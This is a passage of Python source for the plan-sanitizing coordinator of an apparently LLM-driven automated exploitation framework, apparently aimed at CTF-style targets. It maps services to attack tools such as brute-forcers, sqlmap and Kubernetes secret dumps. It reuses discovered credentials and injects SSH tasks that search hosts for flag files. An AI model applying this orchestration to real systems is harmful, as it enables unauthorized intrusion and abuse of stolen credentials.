"""PlanCoordinator — exploitation plan generation and review.

Owns plan sanitization, structured generation with schema repair, cycle detection, plan review/fix and credential extraction. State and cross-coordinator calls are forwarded to the shared Orchestrator context.
"""
from __future__ import annotations

import asyncio
import contextlib
import json
import logging
import os
import re
import shutil
import time
from dataclasses import dataclass, field, replace
from typing import Any, Dict, List, Optional

log = logging.getLogger(__name__)

# Parameter names that carry an HTTP request target.  A tool declaring any of
# these is an HTTP-capable tool even when it is not literally called "url".
_HTTP_TARGET_PARAMS = frozenset(
    {"url", "endpoint_url", "target_url", "base_url", "ssrf_url"}
)

# Preference order when a planned tool has to be replaced by a generic HTTP
# tool: arbitrary-method first (headers + JSON body), then form POST, then the
# payload injector, then the plain fetcher.
_HTTP_TOOL_PRIORITY = ("http_method_probe", "http_post", "send_payload", "curl_get")

# Vulnerability families whose exploitation IS a write (publish / register /
# overwrite a resource). A read-only default tool can never satisfy them, so
# they resolve to a tool that can express PUT/POST/PATCH/DELETE.
_WRITE_VULN_KEYWORDS = (
    "dependency", "supply", "poison", "squat", "publish", "package", "artifact",
)
_WRITE_DEFAULT_TOOL = "http_method_probe"

# A plan review regenerates the whole plan, so it is only worth its cost once
# the previous rewrite has been TESTED by real executions.

# Documented body fields whose value the server executes as code, a script or
# a command. Output of such a field often never returns in the HTTP response
# (the work is queued and run asynchronously), so the plan needs the OOB flow.
_EXEC_FIELD_NAMES = frozenset({
    "script", "cmd", "command", "code", "shell", "hook", "run", "exec", "payload",
})

#: Response/URL markers that are actually evidence of a Docker Registry v2 API.
_REGISTRY_SIGNALS = (
    "docker-distribution", "docker registry", "registry/2.0", "docker-registry",
)


def registry_signal(text: str) -> bool:
    """Whether an endpoint signature proves a Docker Registry v2 API.

    A bare ``/v2/`` used to qualify: it matched any URL containing that path
    segment (e.g. a CMS probe endpoint such as ``/wp-json/wp/v2/``) and sent the
    planner off poisoning a registry the target never exposed.
    """
    lowered = str(text or "").lower()
    return any(marker in lowered for marker in _REGISTRY_SIGNALS)


def exec_body_fields(params: Any) -> List[str]:
    """Documented body fields whose value the server executes as code."""
    names = {
        field.strip().lower()
        for field in str(params or "").replace(";", ",").split(",")
        if field.strip()
    }
    return sorted(names & _EXEC_FIELD_NAMES)
_MIN_EXECUTIONS_BETWEEN_REVIEWS = 3

#: Below this much remaining budget a full plan rewrite costs more than it can
#: return; the run goes straight to the final sweep instead.
_REVIEW_MIN_REMAINING_SECONDS = 120.0

#: An LLM round trip shorter than this cannot produce a usable answer, so it
#: is not started at all: the run spent its last 12 seconds on a plan review
#: that was guaranteed to be discarded.
_LLM_MIN_REMAINING_SECONDS = 25.0

#: Failure classes that mean the plan itself is wrong (rather than the
#: hypothesis): they justify an immediate review without waiting for
#: ``_MIN_EXECUTIONS_BETWEEN_REVIEWS``.
_REVIEW_TRIGGERING_FAILURES = frozenset({
    "invalid_argument", "tool_error", "strategy_failed",
})


def normalize_success_condition(condition: Any) -> dict | None:
    """Keep only conditions the runtime can actually verify.

    An unrecognised condition used to degrade to "the tool exited 0" inside
    the executor, which is how a substituted call or a wrong-verb request got
    counted as a completed task. Dropping it here is explicit and leaves the
    task judged on real execution facts only.
    """
    if not isinstance(condition, dict):
        return None
    ctype = str(condition.get("type", "") or "").strip().lower()
    if not ctype:
        return None
    if ctype not in KNOWN_CONDITION_TYPES:
        log.warning(
            "dropping unsupported success_condition type %r (known: %s)",
            ctype, sorted(KNOWN_CONDITION_TYPES),
        )
        return None
    return {**condition, "type": ctype}


def _pick_http_tool(
    tool_specs: dict, declared_params: dict | None = None,
) -> str:
    """First available HTTP tool from the preference order, or ""."""
    for name in _HTTP_TOOL_PRIORITY:
        spec = tool_specs.get(name)
        if spec is None:
            continue
        if not (_HTTP_TARGET_PARAMS & set(getattr(spec, "parameters", {}) or {})):
            continue
        if not is_available(spec):
            continue
        return name
    return ""

from darwin.cteg import CTEG, TaskRecord, build_scenario_profile
from darwin.core.context import ContextManager
from darwin.core.contracts import (
    Budget,
    Objective,
    ReplanRecommendation,
    TaskOutcome,
    TaskStatus,
)
from darwin.core.evaluator import (
    Evaluation,
    Evaluator as CoreEvaluator,
    FailureType,
)
from darwin.core.executor import ToolExecutor, ExecutionResult as CoreExecutionResult
from darwin.core.memory import MemoryManager
from darwin.core.metrics import MetricsCalculator
from darwin.core.replan import Replanner
from darwin.core.runtime import Runtime
from darwin.core.scheduler import ParityScheduler
from darwin.core.schemas import (
    parse_analyze_output,
    parse_plan_tasks,
    parse_research_findings,
    parse_service_research_findings,
)
from darwin.orchestration.structured import render_tool_contract_card
from darwin.orchestration.execution import (
    _WRITE_METHODS,
    _call_method,
    _planned_write_intent,
)
from darwin.core.task import Task, deps_from_task_ids, realign_success_condition
from darwin.core.task_graph import TaskGraph, dependency_task_ids
from darwin.core.belief import (
    node_ids_by_type,
    render_belief_snapshot,
    render_critical_facts,
    render_new_discoveries,
)
from darwin.data_model import (
    normalize_dkg_state, PipelineState, EndpointInfo,
    OrchestratorPhase, TaskResult, VulnerabilityHypothesis, ExploitationPlan,
)
from darwin.dkg import DKG
from darwin.dpm import DefensePerceptionModule, DefenseStateVector
from darwin.dave import DAVE, ExploitAttempt, parse_tool_stdout
from darwin.tools.mcp_client import MCPClientPool, load_mcp_config
from darwin.tools.mcp_gateway import ToolResult
from darwin.tools.contracts import (
    http_tool_can_express,
    http_tools_for,
    request_body_kind,
)
from darwin.tools.recon_server import create_recon_gateway, parse_response
from darwin.tools.attack_server import create_attack_gateway
from darwin.tools.availability import is_available
from darwin.utils.http_client import HTTPClient, ProbeClient, HTTPResponse
from darwin.utils.llm import LLMSession
from darwin.utils.phase_logger import PhaseLogger
from darwin.utils.thought_logger import ThoughtLogger


def _attack_path_dependency(action: dict, instruction: str = "") -> dict | None:
    """Return a structured path dependency when a task names path_id."""
    action = action or {}
    path_id = str(action.get("path_id", "") or "")
    if not path_id:
        params = action.get("params", {}) or {}
        if isinstance(params, dict):
            path_id = str(params.get("path_id", "") or "")
    if not path_id:
        match = re.search(r"(?:path[_ -]?id|attack path)[:= ]+([\w.-]+)", instruction or "", re.I)
        path_id = match.group(1) if match else ""
    return {"type": "requires_attack_path", "path_id": path_id} if path_id else None


# -- System Prompts (imported from darwin.prompts) --------------------------
from darwin.prompts.orchestrator import (
    SYSTEM_PROMPT_ORCHESTRATOR_UNIFIED,
    SYSTEM_PROMPT_ANALYZE,
    SYSTEM_PROMPT_LOGIN,
    SYSTEM_PROMPT_BYPASS,
    PLANNER_TASKS_SCHEMA_EXAMPLE,
    SUCCESS_CONDITION_GUIDE,
    KNOWN_CONDITION_TYPES,
)
from darwin.prompts.planner import SYSTEM_PROMPT_PLANNER
from darwin.prompts.evaluator import SYSTEM_PROMPT_EVALUATOR
from darwin.prompts.research import SYSTEM_PROMPT_RESEARCH


from darwin.orchestration.context import CoordinatorContext


def _note_skipped(task_view: dict, note: str) -> None:
    """Append a skip reason once, not once per plan review.

    The instruction string survives reviews, so re-appending produced
    ``[skipped: aws_cli binary not installed]`` eight times on one task.
    """
    instruction = str(task_view.get("instruction", "") or "")
    if note not in instruction:
        task_view["instruction"] = f"{instruction} {note}".strip()


class PlanCoordinator(CoordinatorContext):
    def _llm_min_remaining(self) -> float:
        """Smallest remaining budget that can still pay for one LLM call.

        The floor must not exceed a small share of the run: a 30-second smoke
        run cannot be expected to keep 25 seconds free for one call.
        """
        try:
            budget = float(getattr(self, "time_budget", 0) or 0)
        except Exception:
            budget = 0.0
        if budget <= 0:
            return _LLM_MIN_REMAINING_SECONDS
        return min(_LLM_MIN_REMAINING_SECONDS, budget * 0.1)

    def _migrate_blocked_path_tasks(self) -> int:
        """Move tasks blocked on stale/rejected attack paths to NEEDS_REPLAN.

        Returns the number of migrated tasks.  Tasks whose path is still
        active remain untouched; tasks whose path is permanently rejected
        stay blocked (the planner will drop them on the next review).
        """
        try:
            invalid = {
                str(state.get("path_id", ""))
                for state in self.dkg.attack_path_states()
                if state.get("status") in {"stale", "rejected"}
            }
        except Exception:
            return 0
        if not invalid:
            return 0
        plan = getattr(self, "exploitation_plan", None)
        if plan is None:
            return 0
        migrated = 0
        for candidate in list(plan.tasks):
            if candidate.status is not TaskStatus.BLOCKED:
                continue
            blocked_paths = {
                str(dep.get("path_id", ""))
                for dep in (candidate.dependencies or [])
                if isinstance(dep, dict)
                and dep.get("type") == "requires_attack_path"
            }
            if blocked_paths & invalid:
                candidate.status = TaskStatus.NEEDS_REPLAN
                migrated += 1
                self._task_log_event(
                    "info", "replan_requested", task_id=candidate.id,
                    action="attack_path",
                    path_id=sorted(blocked_paths & invalid)[0],
                )
        return migrated

    def _apply_priority_hints(self, tasks: list[Task]) -> None:
        """Raise task priority when the task target matches an observed
        relation hint from the topology analysis; weak hints never raise."""
        hints = getattr(getattr(self, "_topology_analysis", None), "priority_hints", None)
        if not hints:
            return
        try:
            dkg = self.dkg
            for task in tasks:
                action = task.action or {}
                params = action.get("params", {}) or {}
                if isinstance(params, str):
                    try:
                        params = json.loads(params)
                    except (TypeError, ValueError):
                        params = {}
                target = str(
                    action.get("target", "")
                    or params.get("url", "")
                    or params.get("target_url", "")
                    or ""
                ).strip()
                if not target:
                    continue
                best = float(getattr(task, "priority", 0.5) or 0.5)
                for key, hint_value in hints.items():
                    if "->" not in key or ":" not in key.rsplit("->", 1)[-1]:
                        continue
                    try:
                        from_id, rest = key.split("->", 1)
                        to_id = rest.rsplit(":", 1)[0]
                    except (ValueError, TypeError):
                        continue
                    try:
                        hint_value = float(hint_value)
                    except (TypeError, ValueError):
                        continue
                    if hint_value <= 0.6:
                        continue
                    for node_id in (from_id, to_id):
                        node = dkg.get_node(node_id) if node_id else None
                        if not node:
                            continue
                        candidates = (
                            str(node.get("url", "")),
                            str(node.get("name", "")),
                            str(node.get("ip", "")),
                        )
                        if any(c and (c in target or target in c) for c in candidates):
                            best = max(best, min(0.95, hint_value))
                            break
                task.priority = min(0.95, best)
        except Exception as exc:
            log.debug("Plan: priority hint application skipped (%s)", exc)

    def _sanitize_plan_tools(self, tasks: list[Task]) -> None:
        """Replace blacklisted tools in-place across ALL plan tasks.

        Called after every plan generation / review / replan to ensure
        time-wasting tools (e.g. hydra_ssh_brute) never reach execution,
        regardless of which code path injected them.
        """
        _unusable = self._unusable_tools()
        # v2: the plan is stored as typed Tasks; this sanitizer keeps its
        # legacy dict-based transformation logic verbatim by working on a
        # mutable legacy view, then writes the mutated fields back onto the
        # Task objects and converts any newly appended hint tasks to Tasks.
        _caller_list = tasks
        _plan_tasks = list(tasks)
        _VIEW_STATUS = {
            TaskStatus.READY: "pending",
            TaskStatus.CREATED: "pending",
            TaskStatus.SUCCESS: "done",
            TaskStatus.FAILED: "failed",
            TaskStatus.ABANDONED: "skipped",
        }
        tasks = [
            {
                "id": t.id,
                "instruction": t.instruction,
                "tool": str((t.action or {}).get("tool", "") or ""),
                "params": (t.action or {}).get("params", {}) or {},
                "status": _VIEW_STATUS.get(t.status, t.status.value),
                "dependent_task_ids": dependency_task_ids(t),
                "source": t.source,
            }
            for t in _plan_tasks
        ]

        # Resolve $credentials.* placeholders from DKG state
        _dkg_creds = self.dkg.query_nodes("Credential")
        _resolved_user = ""
        _resolved_pass = ""
        _resolved_host = ""
        _resolved_port = 0
        _resolved_cred_type = ""
        for c in _dkg_creds:
            if c.get("username"):
                _resolved_user = str(c.get("username"))
                _resolved_pass = str(c.get("password", "") or "")
                _resolved_host = str(c.get("host", "") or "")
                _resolved_cred_type = str(c.get("cred_type", "") or "").lower()
                _cp = c.get("port", 0)
                if _cp:
                    _resolved_port = int(_cp)
                break
        # If credential has no port, look up the SSH service port from DKG
        if not _resolved_port:
            for s in self.dkg.query_nodes("Service"):
                _svc_name = (s.get("service_name", "") or "").lower()
                if "ssh" in _svc_name or s.get("port") == 22:
                    _p = s.get("port", 0)
                    if _p and _p != 22:
                        _resolved_port = int(_p)
                        break

        # Reject cloud CLI tools for tasks whose evidence is an HTTP request.
        # This is contract-driven (URL/method/data parameters and tool domain),
        # so new HTTP tools participate without another port-specific branch.
        _tool_specs = {}
        try:
            _tool_specs.update(self.attack_gateway.get_tool_specs())
            _tool_specs.update(self.recon_gateway.get_tool_specs())
        except Exception:
            _tool_specs = {}

        # ── Protocol-aware tool validation ──
        # Build a set of VALID tools for each port discovered during bootstrap.
        # Any plan task targeting a known port with a protocol-incompatible tool
        # gets auto-corrected to the right tool or skipped.
        _PORT_VALID_TOOLS: dict[str, set[str]] = {
            "1433": {"mssql_query", "mssqlclient_query", "shell_exec"},
            "3306": {"mysql_query", "shell_exec"},
            "5432": {"psql_query", "shell_exec"},
            "6379": {"redis_cmd", "shell_exec"},
            "1521": {"oracle_query", "shell_exec"},
            "27017": {"shell_exec"},
            "11211": {"shell_exec"},
            "22":   {"ssh_exec", "ssh_key_exec", "test_credential"},
            "80":   {"curl_get", "http_post", "send_payload", "ffuf_fuzz", "hydra_http_brute", "sqlmap_test"},
            "443":  {"curl_get", "http_post", "send_payload", "ffuf_fuzz", "hydra_http_brute", "sqlmap_test"},
        }
        _PROTO_DEFAULT_TOOL: dict[str, str] = {
            "mssql": "mssqlclient_query", "mysql": "mysql_query",
            "postgres": "psql_query", "redis": "redis_cmd",
            "oracle": "oracle_query", "ssh": "ssh_exec",
            "http": "curl_get", "https": "curl_get",
        }
        # Augment with DKG service name detection
        _svc_port_to_proto: dict[str, str] = {}
        for s in self.dkg.query_nodes("Service"):
            _port = str(s.get("port", ""))
            _name = (s.get("service_name", "") or "").lower()
            if _port and not _svc_port_to_proto.get(_port):
                if "mssql" in _name or "sql server" in _name:
                    _svc_port_to_proto[_port] = "mssql"
                elif "mysql" in _name: _svc_port_to_proto[_port] = "mysql"
                elif "postgres" in _name: _svc_port_to_proto[_port] = "postgres"
                elif "redis" in _name: _svc_port_to_proto[_port] = "redis"
                elif "oracle" in _name: _svc_port_to_proto[_port] = "oracle"
                elif "ssh" in _name: _svc_port_to_proto[_port] = "ssh"
                elif "http" in _name: _svc_port_to_proto[_port] = "http"

        for t in tasks:
            if not isinstance(t, dict):
                continue
            tool = str(t.get("tool", "")).strip()

            _params_probe = t.get("params", {}) if isinstance(t.get("params"), dict) else {}
            _evidence = " ".join([
                str(t.get("instruction", "")),
                str(_params_probe.get("url", "")),
                str(_params_probe.get("target_url", "")),
                str(_params_probe.get("endpoint_url", "")),
                str(_params_probe.get("base_url", "")),
                str(_params_probe.get("command", "")),
            ]).lower()
            _spec = _tool_specs.get(tool)
            _spec_domains = {str(d).lower() for d in getattr(_spec, "domains", [])} if _spec else set()
            if tool and ("http://" in _evidence or "https://" in _evidence):
                # A tool whose only request target is a non-``url`` alias
                # (endpoint_url/target_url) is still a legitimate HTTP tool —
                # cloud/object-store tools must not be discarded just because
                # their parameter is not literally named "url".
                _declared = getattr(_spec, "parameters", {}) if _spec else {}
                if "cloud" in _spec_domains and not _HTTP_TARGET_PARAMS & set(_declared):
                    _replacement = _pick_http_tool(_tool_specs, _declared)
                    if _replacement:
                        t["tool"] = _replacement
                        t["instruction"] = (
                            t.get("instruction", "")
                            + f" [auto-corrected by ToolSpec: {_replacement}]"
                        )
                        tool = _replacement
                    else:
                        # No usable HTTP substitute — keep the task and let the
                        # executor surface the real error instead of silently
                        # dropping an otherwise valid plan entry.
                        log.warning(
                            "No HTTP-compatible substitute for tool '%s'; "
                            "keeping the task as planned", tool,
                        )

            # ── Post-generation tool inference ─────────────────────
            # When the plan LLM leaves tool empty, infer the correct
            # dedicated tool from the DKG service name.  This prevents
            # the execution LLM from defaulting to shell_exec for tasks
            # that have a clearly matching service (etcd, K8S, etc.).
            if not tool:
                _instr = (t.get("instruction", "") or "").lower()
                for _svc in self.dkg.query_nodes("Service"):
                    _svc_name = (_svc.get("service_name", "") or "").lower()
                    _svc_port = str(_svc.get("port", ""))
                    if not _svc_name:
                        continue
                    # Build params from DKG service data
                    _svc_params: dict = {}
                    if _svc_port:
                        _ep = f"localhost:{_svc_port}"
                        _svc_params["host"] = "localhost"
                        _svc_params["port"] = int(_svc_port)
                    if "etcd" in _svc_name:
                        # Pick most specific tool: key listing vs value reading
                        if any(kw in _instr for kw in ("key", "enum", "list", "all", "prefix")):
                            tool = "k8s_etcd_keys"
                        else:
                            tool = "etcdctl_get"
                        _svc_params["endpoint"] = f"https://{_ep}"
                        _svc_params["insecure"] = True
                        _svc_params["key"] = "/"
                    elif "kubernetes-admission" in _svc_name:
                        # Admission webhook — HTTP JSON API, not kubectl
                        tool = "send_payload"
                        _svc_params["url"] = f"https://{_ep}"
                    elif "kubernetes" in _svc_name:
                        if "secret" in _instr:
                            tool = "kubectl_get_secrets"
                        elif "pod" in _instr:
                            tool = "kubectl_get_pods"
                        else:
                            tool = "kubectl_auth_check"
                    elif "kubelet" in _svc_name:
                        if "exec" in _instr or "command" in _instr:
                            tool = "k8s_kubelet_exec"
                        else:
                            tool = "kubelet_probe"
                    elif "tiller" in _svc_name:
                        tool = "helm"
                        # Build --host from DKG service data:
                        # svc_name="k8s-tiller-deploy", banner="...tiller-deploy.kube-system.svc.cluster.local"
                        _tiller_host = (_svc.get("cluster_ip", "") or "")
                        _tiller_ns = (_svc.get("k8s_namespace", "") or "kube-system")
                        _tiller_name = (_svc_name.replace("k8s-", "") if _svc_name.startswith("k8s-") else _svc_name)
                        if _tiller_name and _tiller_ns:
                            _tiller_host = f"{_tiller_name}.{_tiller_ns}:44134"
                        _svc_params["command"] = (
                            f"--host {_tiller_host} ls --all"
                            if _tiller_host else "ls --all"
                        )
                    # Merge inferred params into existing params (don't overwrite)
                    if _svc_params:
                        _existing = dict(t.get("params", {}) if isinstance(t.get("params"), dict) else {})
                        for _k, _v in _svc_params.items():
                            _existing.setdefault(_k, _v)
                        t["params"] = _existing
                    if tool:
                        t["tool"] = tool
                        break  # first matching service wins

            _params = t.get("params", {}) if isinstance(t.get("params"), dict) else {}
            _task_port = str(_params.get("port", ""))
            # LLM sometimes puts port in host (e.g. "localhost:10119")
            if not _task_port:
                _host = str(_params.get("host", _params.get("target", "")))
                if ":" in _host:
                    _maybe_port = _host.rsplit(":", 1)[-1]
                    if _maybe_port.isdigit():
                        _task_port = _maybe_port

            # Determine the valid tool set for this task's target port
            _valid_tools: set[str] | None = None
            if _task_port and _task_port in _PORT_VALID_TOOLS:
                _valid_tools = _PORT_VALID_TOOLS[_task_port]
            elif _task_port and _task_port in _svc_port_to_proto:
                _proto = _svc_port_to_proto[_task_port]
                # Non-standard ports need protocol-based tool validation
                if _proto == "ssh":
                    _valid_tools = {"test_credential", "ssh_exec", "ssh_key_exec", "hydra_ssh_brute", "shell_exec"}
                elif _proto == "mssql":
                    _valid_tools = {"mssql_query", "mssqlclient_query", "shell_exec"}
                elif _proto in ("mysql", "mariadb"):
                    _valid_tools = {"mysql_query", "shell_exec"}
                elif _proto == "postgres":
                    _valid_tools = {"psql_query", "shell_exec"}
                elif _proto == "redis":
                    _valid_tools = {"redis_cmd", "shell_exec"}
                elif _proto == "oracle":
                    _valid_tools = {"oracle_query", "shell_exec"}
                else:
                    _valid_tools = _PORT_VALID_TOOLS.get(
                        _task_port, set()
                    )

            # If tool is incompatible with the target port, correct or skip
            if _valid_tools is not None and tool and tool not in _valid_tools:
                # Try to find a compatible replacement
                _proto = _svc_port_to_proto.get(_task_port, "")
                _replacement = _PROTO_DEFAULT_TOOL.get(_proto, "")
                if _replacement and _replacement in _valid_tools:
                    if _replacement != tool and "query" in _replacement:
                        _params.setdefault("query", "SELECT 1 AS test")
                    t["tool"] = _replacement
                    t["instruction"] = (
                        t.get("instruction", "")
                        + f" [auto-corrected: {tool}→{_replacement} (protocol mismatch for port {_task_port})]"
                    )
                    tool = _replacement
                elif tool in {"test_credential", "ssh_exec", "ssh_key_exec", "hydra_ssh_brute"}:
                    # SSH tools on non-SSH ports → skip, can't fix
                    t["status"] = "skipped"
                    continue

            if tool in self._BLACKLISTED_TOOLS:
                replacement = self._BLACKLISTED_TOOLS[tool]
                if not replacement:
                    # Tool binary not available — skip the task entirely
                    t["status"] = "skipped"
                else:
                    t["tool"] = replacement
                    t["instruction"] = (
                        t.get("instruction", "")
                        .replace("brute force", "authenticate")
                        .replace("brute-force", "authenticate")
                        .replace("Brute force", "Authenticate")
                    )
                    # Convert params for tool replacement
                    _rep_params = t.get("params", {})
                    if isinstance(_rep_params, dict):
                        if tool == "hydra_ssh_brute" and replacement == "ssh_exec":
                            _target = str(_rep_params.get("target", ""))
                            if ":" in _target:
                                _parts = _target.rsplit(":", 1)
                                _rep_params["host"] = _parts[0]
                                try:
                                    _rep_params["port"] = int(_parts[1])
                                except ValueError:
                                    _rep_params["port"] = 22
                            else:
                                _rep_params["host"] = _target
                            _rep_params.pop("target", None)
                            t["params"] = _rep_params

            # Host availability gate: a planned tool whose binary is not
            # installed can only fail with exit=127, so swap it for an
            # available HTTP-capable tool when the task is an HTTP task, and
            # otherwise drop it with a recorded reason instead of burning a
            # scheduler slot.
            if tool and tool not in self._BLACKLISTED_TOOLS:
                _known_reason = _unusable.get(tool, "")
                if _known_reason:
                    # The run already learned this tool cannot work here; a
                    # review that re-creates the task must not re-learn it
                    # (one cloud-30 task was skipped this way eight times).
                    t["status"] = "skipped"
                    _note_skipped(t, f"[skipped: {tool} {_known_reason}]")
                    continue
                _avail_spec = _tool_specs.get(tool)
                if _avail_spec is not None and not is_available(_avail_spec):
                    self._remember_unusable(tool, "binary not installed")
                    _is_http_task = "http://" in _evidence or "https://" in _evidence
                    _substitute = (
                        _pick_http_tool(_tool_specs) if _is_http_task else ""
                    )
                    if _substitute and _substitute != tool:
                        log.warning(
                            "Tool '%s' is not installed on this host — "
                            "replacing with '%s'", tool, _substitute,
                        )
                        t["tool"] = _substitute
                        t["instruction"] = (
                            t.get("instruction", "")
                            + f" [auto-corrected: {tool}→{_substitute} "
                              f"(binary not installed)]"
                        )
                        tool = _substitute
                    else:
                        log.warning(
                            "Tool '%s' is not installed on this host — "
                            "skipping task '%s'", tool, t.get("id", "?"),
                        )
                        t["status"] = "skipped"
                        _note_skipped(
                            t, f"[skipped: {tool} binary not installed]",
                        )
                        continue

            # Block raw SSH in shell_exec — running "ssh" or "sshpass"
            # triggers an interactive password prompt that hangs the tool.
            # Scan the ENTIRE command for ssh/sshpass — LLMs often embed
            # them inside compound commands (cd X && ssh Y, bash -c 'ssh Y').
            if tool == "shell_exec":
                _cmd = str(t.get("params", {}).get("command", ""))
                # Find the last standalone "ssh" or "sshpass" in the command
                # — the actual invocation, skipping comments and echo.
                _ssh_match = list(re.finditer(
                    r'\b(sshpass|ssh)\b(?![-\w]*=)', _cmd
                ))
                if _ssh_match:
                    # Take the LAST match — most likely the actual ssh call
                    _m = _ssh_match[-1]
                    _ssh_start = _m.start()
                    # Skip if preceded by echo/printf/which/apt/install/#
                    _prefix = _cmd[:_ssh_start].strip()
                    _prefix_last_line = _prefix.rsplit("\n", 1)[-1].rsplit(";", 1)[-1].rsplit("&&", 1)[-1].rsplit("||", 1)[-1]
                    _pre_words = _prefix_last_line.strip().split()
                    if _pre_words and _pre_words[-1] in (
                        "echo", "printf", "which", "apt", "apt-get", "yum",
                        "man", "help", "whereis", "type", "#",
                    ):
                        pass  # false positive — informational command
                    else:
                        # Parse arguments starting from the ssh/sshpass token
                        _rest = _cmd[_ssh_start:]
                        _cmd_words = _rest.split()
                        _ssh_host = ""
                        _ssh_port = 22
                        _ssh_user = ""
                        _ssh_cmd = "id"
                        _ssh_pass = ""
                        _is_sshpass = (_cmd_words[0] == "sshpass")
                        for i, w in enumerate(_cmd_words):
                            if w in ("sshpass", "ssh", "ssh-copy-id") and i == 0:
                                continue
                            if w == "-p" and i + 1 < len(_cmd_words):
                                if _is_sshpass and i == 1:
                                    _ssh_pass = _cmd_words[i + 1]
                                else:
                                    try:
                                        _ssh_port = int(_cmd_words[i + 1])
                                    except ValueError as exc:
                                        log.debug("swallowed exception: %s", exc, exc_info=True)
                            elif w == "-l" and i + 1 < len(_cmd_words):
                                _ssh_user = _cmd_words[i + 1]
                            elif "@" in w and not w.startswith("-"):
                                _user_host = w.split("@")
                                _ssh_user = _ssh_user or _user_host[0]
                                _ssh_host = _user_host[-1]
                            elif w == "-i":
                                pass  # key-based — skip, can't auto-convert
                        if _ssh_host:
                            t["tool"] = "ssh_exec"
                            _new_params: dict = {
                                "host": _ssh_host,
                                "port": _ssh_port,
                                "username": _ssh_user or "root",
                                "password": _ssh_pass,
                                "command": _ssh_cmd,
                            }
                            t["params"] = _new_params
                            t["instruction"] = (
                                t.get("instruction", "")
                                + " [auto-corrected: shell_exec→ssh_exec (SSH in shell_exec triggers interactive prompt)]"
                            )

            # ssh_exec is for simple remote commands, not local scripts.
            # Redirect when the instruction describes credential testing
            # or the command contains scripts (newlines, sshpass, python).
            if tool == "ssh_exec":
                _instr = str(t.get("instruction", "")).lower()
                _cmd = str(t.get("params", {}).get("command", ""))
                _is_cred_test = any(kw in _instr for kw in (
                    "batch-test", "batch test",
                    "brute force", "brute-force", "dictionary", "wordlist",
                ))
                _is_script = "\n" in _cmd or "sshpass" in _cmd or len(_cmd) > 500
                if _is_cred_test or _is_script:
                    t["tool"] = "shell_exec"
                    t["params"] = {"command": _cmd}
                    t["instruction"] = (
                        t.get("instruction", "")
                        + " [auto-corrected: ssh_exec→shell_exec (credential testing must run locally)]"
                    )

            # Block CVE-2024-6387 (regreSSHion) tasks — this is a complex
            # pre-auth race condition exploit that requires ~10,000 attempts
            # and specific glibc versions.  It wastes 5+ minutes on every SSH
            # scenario and almost never succeeds in container environments.
            _instr = str(t.get("instruction", "")).lower()
            if "cve-2024-6387" in _instr or "regresshion" in _instr:
                t["status"] = "skipped"
                continue

            # Block local filesystem access via file:// URLs — flag must come
            # from the TARGET, not from searching the DARWIN host filesystem.
            _params = t.get("params", {})
            if isinstance(_params, dict):
                _url_val = str(_params.get("url", ""))
                if _url_val.startswith("file://") and t.get("tool", "") in ("curl_get", "http_post"):
                    t["status"] = "skipped"
                    continue
            # Resolve $credentials.* placeholders in task params
            if isinstance(_params, dict):
                _has_cred_ref = any(
                    isinstance(v, str) and "$credentials." in v
                    for v in _params.values()
                )
                if _has_cred_ref:
                    if _resolved_user:
                        for _key, _val in list(_params.items()):
                            if isinstance(_val, str) and "$credentials." in _val:
                                _params[_key] = _val.replace(
                                    "$credentials.username", _resolved_user
                                ).replace(
                                    "$credentials.password", _resolved_pass
                                )
                        # Also inject host/port from credential — these
                        # are commonly wrong (default port 22, etc.) when
                        # the plan LLM lacks service context at gen time.
                        if _resolved_host and not str(_params.get("host", "")).strip():
                            _params["host"] = _resolved_host
                        if _resolved_port and int(_params.get("port", 0) or 0) in (0, 22):
                            _params["port"] = _resolved_port
                    else:
                        # No credentials available — task can't run
                        t["status"] = "skipped"
                        continue

        # ── Cascade skip to dependent tasks ──────────────────────
        # When a task is blacklisted or protocol-incompatible and
        # gets skipped, all tasks that depend on it can never run.
        # Mark them skipped too, in topological order, so the LLM
        # doesn't waste iterations waiting for impossible dependencies.
        _skipped_ids = {t.get("id", "") for t in tasks if t.get("status") == "skipped"}
        _changed = True
        while _changed:
            _changed = False
            for t in tasks:
                if t.get("status") != "pending":
                    continue
                _deps = t.get("dependent_task_ids", []) or t.get("dependencies", [])
                if not _deps:
                    continue
                if all(d in _skipped_ids for d in _deps):
                    t["status"] = "skipped"
                    _skipped_ids.add(t.get("id", ""))
                    _changed = True

        # ── Credential-aware hint: use discovered credentials ─────
        # When credentials were auto-extracted but no task uses them
        # to log in, inject one.  Cred_type-aware: SSH creds get
        # ssh_exec, AWS creds get aws_cli, others get the appropriate
        # client tool.  Without this, the plan review LLM often adds
        # credential-guessing tasks instead of using what we already have.
        if _resolved_user and _resolved_pass and tasks:
            # Determine the right tool based on cred_type
            _cred_tool = "ssh_exec"
            _cred_instruction = (
                f"SSH into {_resolved_host or self.target_host}:{_resolved_port or 22} "
                f"as {_resolved_user} using the discovered password. Immediately hunt "
                f"for flag: cat /flag* /root/flag* /home/*/flag* /tmp/flag* 2>/dev/null; "
                f"find / -maxdepth 4 -name '*flag*' -type f 2>/dev/null | head -10"
            )
            _cred_params: dict = {
                "host": _resolved_host or self.target_host,
                "port": _resolved_port or 22,
                "username": _resolved_user,
                "password": _resolved_pass,
                "command": (
                    "cat /flag* /root/flag* /home/*/flag* /tmp/flag* 2>/dev/null; "
                    "find / -maxdepth 4 -name '*flag*' -type f 2>/dev/null | head -10"
                ),
            }
            if _resolved_cred_type == "aws":
                _cred_tool = "aws_cli"
                _cred_instruction = (
                    f"Use discovered AWS credentials ({_resolved_user} / "
                    f"{_resolved_pass[:20]}...) to enumerate S3 buckets and "
                    f"retrieve objects. Try: aws_cli s3 ls --endpoint-url "
                    f"http://{_resolved_host or self.target_host}:{_resolved_port or 10704}"
                )
                _cred_params = {
                    "service": "s3",
                    "action": "ls",
                    "endpoint_url": (
                        f"http://{_resolved_host or self.target_host}"
                        f":{_resolved_port or 10704}"
                    ),
                }
            elif _resolved_cred_type in ("mysql", "postgres", "postgresql",
                                          "mssql", "redis", "oracle", "mongodb"):
                _cred_tool = "shell_exec"
                _cred_instruction = (
                    f"Use discovered {_resolved_cred_type} credentials "
                    f"({_resolved_user}:****@{_resolved_host or self.target_host}"
                    f":{_resolved_port}) to connect and enumerate the database "
                    f"for flags and sensitive data."
                )

            _has_login_task = any(
                str(t.get("tool", "")) == _cred_tool
                and str(t.get("params", {}).get("username", "")) == _resolved_user
                and t.get("status") == "pending"
                for t in tasks
            )
            if not _has_login_task:
                tasks.append({
                    "id": f"task-credential-{_resolved_cred_type or 'ssh'}",
                    "instruction": _cred_instruction,
                    "tool": _cred_tool,
                    "params": _cred_params,
                    "dependent_task_ids": [],
                    "status": "pending",
